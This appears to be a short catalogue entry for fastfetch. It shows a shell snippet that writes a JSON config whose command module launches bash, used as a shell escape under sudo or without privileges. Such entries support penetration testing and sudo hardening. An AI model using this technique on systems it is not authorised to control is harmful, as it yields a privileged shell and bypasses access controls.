---
functions:
  shell:
  - code: |-
      TF=$(mktemp)
      echo '{"modules":[{"type":"command","key":"x","text":"bash"}]}' > $TF
      fastfetch -c $TF
    comment: |-
      The `Command` module in a fastfetch JSON config file executes arbitrary shell commands.
    contexts:
      sudo:
      unprivileged:
